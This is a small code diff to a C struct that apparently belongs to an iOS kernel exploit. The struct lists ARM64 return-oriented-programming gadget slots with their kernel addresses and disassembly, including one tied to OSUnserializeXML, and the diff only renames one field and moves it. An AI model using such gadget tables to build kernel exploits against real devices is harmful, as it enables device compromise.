@@ -64,13 +64,13 @@ typedef struct __attribute__ ((__packed__))
         // 0xffffff800402b6a4      c0035fd6  ret
         addr_t gadget_str_x0_x19_load_x20_x19;
 
-        addr_t gadget_ldr_x0_x21_load_x24_19;
         // 0xffffff80042fbfbc      a00240f9  ldr x0, [x21]
         // 0xffffff80042fbfc0      fd7b43a9  ldp x29, x30, [sp, 0x30]
         // 0xffffff80042fbfc4      f44f42a9  ldp x20, x19, [sp, 0x20]
         // 0xffffff80042fbfc8      f65741a9  ldp x22, x21, [sp, 0x10]
         // 0xffffff80042fbfcc      f85fc4a8  ldp x24, x23, [sp], 0x40
         // 0xffffff80042fbfd0      c0035fd6  ret
+        addr_t gadget_ldr_x0_x21_load_x24_x19;
 
         addr_t gadget_OSUnserializeXML_return;
 
